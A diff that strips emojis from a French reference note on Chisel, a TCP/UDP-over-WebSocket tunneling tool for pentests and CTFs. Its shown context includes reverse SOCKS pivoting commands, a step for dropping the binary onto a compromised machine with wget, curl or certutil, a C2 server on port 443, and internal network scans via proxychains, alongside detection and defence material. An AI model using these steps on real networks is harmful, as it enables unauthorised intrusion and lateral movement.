@@ -1,11 +1,11 @@
 ---
 title: "Outil - Chisel"
 type: outil
-categorie: 🕹️ C2 & Post-Exploitation
+categorie: C2 & Post-Exploitation
 tags:
   - cyber
   - outil
-  - 🕹️ C2 & Post-Exploitation
+  - C2 & Post-Exploitation
 statut: publie
 version: v1.11.8 (v1.12.0-rc3 en pré-version)
 licence: MIT
@@ -16,20 +16,20 @@ site: https://github.com/jpillora/chisel
 doc: https://github.com/jpillora/chisel#readme
 ---
 
-# 🕹️ Chisel — Tunneling TCP/UDP par WebSocket
+# Chisel — Tunneling TCP/UDP par WebSocket
 
 > [!info] **En 1 phrase**
 > Chisel est un tunnel TCP/UDP encapsulé dans une connexion HTTP via WebSocket : un client et un serveur Go créent un canal chiffré, très utilisé en CTF pour le port forwarding et le proxy SOCKS reverse.
 
 ---
 
-## 🧾 Overview
+## Overview
 
 | Champ | Valeur |
 |---|---|
 | Nom complet | Chisel (fast TCP/UDP tunnel over HTTP) |
 | Description | Tunneling TCP/UDP encapsulé dans HTTP via WebSocket, sécurisé par SSH (clés ECDSA P256) ; binaire unique client + serveur |
-| Catégorie / Sous-catégorie | 🕹️ C2 & Post-Exploitation / Tunneling & Pivoting |
+| Catégorie / Sous-catégorie | C2 & Post-Exploitation / Tunneling & Pivoting |
 | Fonction principale | Port forwarding et proxy SOCKS5 reverse pour franchir les firewalls et pivoter |
 | Type d'outil | CLI (binaire unique Go : `chisel server` / `chisel client`) |
 | Licence | MIT |
@@ -46,7 +46,7 @@ doc: https://github.com/jpillora/chisel#readme
 
 ---
 
-## 🎯 Concept
+## Concept
 
 Chisel fonctionne en deux modes du même binaire : un **serveur** (côté attaquant ou pivot) et un **client** (côté cible). Il tunnelise du trafic TCP (et UDP) dans une session HTTP/WebSocket chiffrée, ce qui lui permet de traverser les firewalls qui n'autorisent que HTTP(S). Le mode `reverse` (`R:`) est le plus utile en offensive : le client (sur la cible) initie la connexion sortante et demande au serveur d'ouvrir des ports ou un proxy SOCKS, sans qu'aucune entrée ne soit nécessaire sur la cible.
 
@@ -63,7 +63,7 @@ flowchart LR
 
 ---
 
-## 🧠 Concepts fondamentaux
+## Concepts fondamentaux
 
 | Concept | Explication |
 |---|---|---|
@@ -77,7 +77,7 @@ flowchart LR
 
 ---
 
-## 🛠️ Installation
+## Installation
 
 ### Debian / Ubuntu / Kali Linux
 
@@ -115,12 +115,12 @@ docker run --rm -p 8080:8080 jpillora/chisel server --reverse --socks5 --port 80
 # go build -o chisel ./cmd/chisel  (ou go install github.com/jpillora/chisel@latest)
 ```
 
-> [!warning] ⚠️ Prérequis & problèmes potentiels
+> [!warning] Prérequis & problèmes potentiels
 > Binaire **statique** : aucune dépendance runtime (wget/curl/certutil suffisent). Garder des versions serveur/client proches (v1.11.x ↔ v1.12 compatibles mais comportement dégradé dans certains cas).
 
 ---
 
-## ⚙️ Configuration
+## Configuration
 
 Chisel n'a **pas** de fichier de configuration global : tout passe par des **flags** et des **variables d'environnement** (préfixe `CHISEL_`, plus `HOST`/`PORT`/`AUTH`).
 
@@ -142,7 +142,7 @@ Chisel n'a **pas** de fichier de configuration global : tout passe par des **fla
 
 ---
 
-## 🏗️ Architecture interne
+## Architecture interne
 
 - **Deux modes dans un binaire Go unique** : `chisel server` (écoute HTTP/WS) et `chisel client` (initie la connexion et demande des remotes).
 - **Transport** : HTTP → upgrade **WebSocket** ; handshake et chiffrement de type **SSH** avec clés **ECDSA P256** (protocole « wire » versionné chisel-v3).
@@ -152,7 +152,7 @@ Chisel n'a **pas** de fichier de configuration global : tout passe par des **fla
 
 ---
 
-## ⌨️ Commandes
+## Commandes
 
 ### Commandes principales
 
@@ -173,11 +173,11 @@ chisel client [options] <serveur> <remote>...
 | `chisel client <ip:port> R:udp:53:127.0.0.1:53` | Tunnel UDP reverse (ex. DNS interne) | UDP relayé via WebSocket |
 | `chisel client <ip:port> R:8080:127.0.0.1:80 R:13389:172.16.5.10:3389` | Plusieurs remotes sur un seul client | Tunnels simultanés |
 
-> Le détail de tous les flags se trouve dans **🎚️ Options et flags** ; les combinaisons type proxy/backend/sni sont illustrées dans **🧪 Exemples pratiques** et **🎬 Scénarios avancés**.
+> Le détail de tous les flags se trouve dans **Options et flags** ; les combinaisons type proxy/backend/sni sont illustrées dans **Exemples pratiques** et **Scénarios avancés**.
 
 ---
 
-## 🎚️ Options et flags
+## Options et flags
 
 | Option | Description | Exemple | Niveau |
 |---|---|---|---|
@@ -205,7 +205,7 @@ chisel client [options] <serveur> <remote>...
 
 ---
 
-## 🧪 Exemples pratiques
+## Exemples pratiques
 
 ### Beginner
 
@@ -240,7 +240,7 @@ proxychains4 -q curl -s http://172.16.5.10/admin
 
 ---
 
-## 🧪 Workflow complet (scénario pas à pas)
+## Workflow complet (scénario pas à pas)
 
 1. **Côté attaquant — démarrer le serveur** en mode reverse + SOCKS : `./chisel server --reverse --socks5 --port 8000` — noter le « Fingerprint » affiché (il servira au `--fingerprint` côté client).
 2. **Déposer le binaire chisel** sur la machine compromise (session C2 : `upload`, `wget`, `curl`, `certutil -urlcache`).
@@ -265,7 +265,7 @@ proxychains4 -q curl -s http://172.16.5.10/admin
 
 ---
 
-## 🎬 Scénarios avancés
+## Scénarios avancés
 
 ### Scénario 1 : pivoting en cascade (multi-hop) et exfiltration de services internes
 
@@ -290,7 +290,7 @@ chisel server --reverse --socks5 --port 443 --tls-domain c2.example.com \
 
 ---
 
-## 🛡️ Cybersecurity use cases
+## Cybersecurity use cases
 
 | Phase | Utilisation |
 |---|---|
@@ -303,7 +303,7 @@ chisel server --reverse --socks5 --port 443 --tls-domain c2.example.com \
 
 ---
 
-## 🎯 MITRE ATT&CK
+## MITRE ATT&CK
 
 | Tactique | Technique / Sub-technique | ID | Raison | Détection | Mitigation |
 |---|---|---|---|---|---|
@@ -318,7 +318,7 @@ chisel server --reverse --socks5 --port 443 --tls-domain c2.example.com \
 
 ---
 
-## 🛡️ Defensive Security
+## Defensive Security
 
 ### Signes observables
 
@@ -393,7 +393,7 @@ rule chisel_go_binary {
 
 ---
 
-## 🤖 Automatisation
+## Automatisation
 
 ```bash
 # Bash — serveur chisel en fond avec journalisation, puis parsing des connexions
@@ -419,7 +419,7 @@ s.close()
 
 ---
 
-## 📤 Output et parsing
+## Output et parsing
 
 Chisel n'a **pas** de sortie structurée : tout passe par les logs texte (`-v` pour le détail côté serveur).
 
@@ -440,22 +440,22 @@ for line in open("chisel.log", errors="ignore"):
 
 ---
 
-## 🔗 Intégrations
+## Intégrations
 
 ```text
 Machine compromise → chisel client → chisel server → SOCKS5 → proxychains4 → nmap / curl / xfreerdp
 ```
 
-- [[Tools|🧰 Outils]] · [[Techniques/Pivoting et Tunneling|🌉 Pivoting et Tunneling]] — contexte du pivoting
-- [[Outil - Ligolo-ng|🪢 Ligolo-ng]] — alternative interface TUN
-- [[Outil - Ncat|🔌 Ncat]] / [[Outil - socat|🪢 socat]] — tunnels simples
-- [[Outil - Nmap|🕵️ Nmap]] — scan du réseau interne via proxychains
-- [[Outil - Metasploit|📦 Metasploit]] — routes/relais complémentaires
-- [[Techniques/Reverse Shells|🐚 Reverse Shells]] — livraison initiale du binaire
+- [[Tools| Outils]] · [[Techniques/Pivoting et Tunneling| Pivoting et Tunneling]] — contexte du pivoting
+- [[Outil - Ligolo-ng| Ligolo-ng]] — alternative interface TUN
+- [[Outil - Ncat| Ncat]] / [[Outil - socat| socat]] — tunnels simples
+- [[Outil - Nmap| Nmap]] — scan du réseau interne via proxychains
+- [[Outil - Metasploit| Metasploit]] — routes/relais complémentaires
+- [[Techniques/Reverse Shells| Reverse Shells]] — livraison initiale du binaire
 
 ---
 
-## 🔄 Alternatives
+## Alternatives
 
 | Outil | Avantages | Inconvénients | Cas d'usage |
 |---|---|---|---|
@@ -468,7 +468,7 @@ Machine compromise → chisel client → chisel server → SOCKS5 → proxychain
 
 ---
 
-## ⚡ Performance
+## Performance
 
 - **Binaire statique unique** : ~4–8 Mo selon plateforme ; image Docker `jpillora/chisel` ~8 Mo compressée (amd64).
 - **Multiplexage** : N tunnels dans une unique connexion WebSocket → une seule connexion TCP sortante par client.
@@ -480,7 +480,7 @@ Machine compromise → chisel client → chisel server → SOCKS5 → proxychain
 
 ---
 
-## 🛠️ Troubleshooting
+## Troubleshooting
 
 ### Common problems
 
@@ -494,7 +494,7 @@ Machine compromise → chisel client → chisel server → SOCKS5 → proxychain
 
 ---
 
-## 🔐 Sécurité de l'outil
+## Sécurité de l'outil
 
 - **Usage légitime** : uniquement dans le cadre autorisé d'un test d'intrusion (dual-use tool utilisé par des APT et ransomware).
 - **Chiffrement** : le transport est chiffré (SSH/ECDSA P256) même sans TLS : ne pas compter sur une inspection du texte clair pour le bloquer.
@@ -505,7 +505,7 @@ Machine compromise → chisel client → chisel server → SOCKS5 → proxychain
 
 ---
 
-## ⚠️ Limitations
+## Limitations
 
 - Le SOCKS5 intégré est **TCP uniquement** ; pour l'UDP, utiliser des remotes `R:udp:` dédiées. Un egress HTTP strict avec inspection de contenu peut bloquer le handshake.
 - Binaire non signé : AppLocker/WDAC/EDR le bloquent s'ils exigent une signature. Pas de sortie structurée (JSON) : monitoring par parsing de logs.
@@ -513,7 +513,7 @@ Machine compromise → chisel client → chisel server → SOCKS5 → proxychain
 
 ---
 
-## 📋 Cheatsheet
+## Cheatsheet
 
 ```bash
 # Serveur reverse + SOCKS5 (attaquant)
@@ -536,7 +536,7 @@ proxychains4 -q nmap -sT -Pn -p 445,3389 172.16.5.0/24
 
 ---
 
-## ⚡ Quick reference
+## Quick reference
 
 | | |
 |---|---|
@@ -545,25 +545,25 @@ proxychains4 -q nmap -sT -Pn -p 445,3389 172.16.5.0/24
 | **Commande principale** | `chisel server --reverse --socks5 --port 8000` puis `chisel client <ip>:8000 R:socks` |
 | **Alternative principale** | Ligolo-ng (TUN), SSH reverse, socat |
 | **Concepts importants** | WebSocket, reverse `R:`, `R:socks`, fingerprint, `--auth`/`--authfile` |
-| **Liens associés** | [[Techniques/Pivoting et Tunneling\|🌉 Pivoting et Tunneling]] · [[Outil - Ligolo-ng\|🪢 Ligolo-ng]] · [[Techniques/Reverse Shells\|🐚 Reverse Shells]] |
+| **Liens associés** | [[Techniques/Pivoting et Tunneling\| Pivoting et Tunneling]] · [[Outil - Ligolo-ng\| Ligolo-ng]] · [[Techniques/Reverse Shells\| Reverse Shells]] |
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
-> Les signes observables, règles Sigma/Suricata/YARA et défenses détaillées figurent dans la section **🛡️ Defensive Security** ci-dessus. Réflexes : surveiller les flux WebSocket sortants, la bannière `SSH-chisel`, les binaires non signés `chisel*` et les écoutes inhabituelles (Sysmon EID 1/3/12).
+> Les signes observables, règles Sigma/Suricata/YARA et défenses détaillées figurent dans la section **Defensive Security** ci-dessus. Réflexes : surveiller les flux WebSocket sortants, la bannière `SSH-chisel`, les binaires non signés `chisel*` et les écoutes inhabituelles (Sysmon EID 1/3/12).
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Tips**
+> [!tip] **Tips**
 > - Utilisez `--fingerprint` pour vérifier l'empreinte du serveur : cela évite qu'un tiers ne capture vos tunnels.
 > - Préférez `R:socks` à une pile de forwards pour pivoter confortablement (un seul canal, tout passe par proxychains).
 > - Générez une clé persistante (`--keygen`/`--keyfile`) : empreinte stable et reconnexion sans surprise.
 > - Sur un egress contraint, écoutez sur 443 (`--tls-domain`) ou utilisez `--proxy` HTTP CONNECT ; vérifiez le SOCKS avec `ss -ltnp | grep 1080` avant proxychains.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - Sans `--reverse` sur le serveur, les tunnels `R:` échouent silencieusement ; `R:socks` place le SOCKS sur le **serveur** (attaquant), pas sur la cible.
 > - Ne comptez pas sur la variable d'env `AUTH` côté serveur (bug GHSA-38jh-8h67-m7mj) : passez `--auth` en flag.
 > - Un serveur chisel sans auth exposé sur Internet est une porte ouverte : toujours authentifier.
@@ -571,7 +571,7 @@ proxychains4 -q nmap -sT -Pn -p 445,3389 172.16.5.0/24
 
 ---
 
-## 📚 References
+## References
 
 ### Official
 
@@ -597,4 +597,4 @@ proxychains4 -q nmap -sT -Pn -p 445,3389 172.16.5.0/24
 
 ---
 
-➡️ **Liens :** [[Tools|🧰 Outils]] · [[Techniques/Pivoting et Tunneling|🌉 Pivoting et Tunneling]] · [[Outils/Outil - Ligolo-ng|🪢 Ligolo-ng]] · [[Techniques/Reverse Shells|🐚 Reverse Shells]]
+**Liens :** [[Tools| Outils]] · [[Techniques/Pivoting et Tunneling| Pivoting et Tunneling]] · [[Outils/Outil - Ligolo-ng| Ligolo-ng]] · [[Techniques/Reverse Shells| Reverse Shells]]
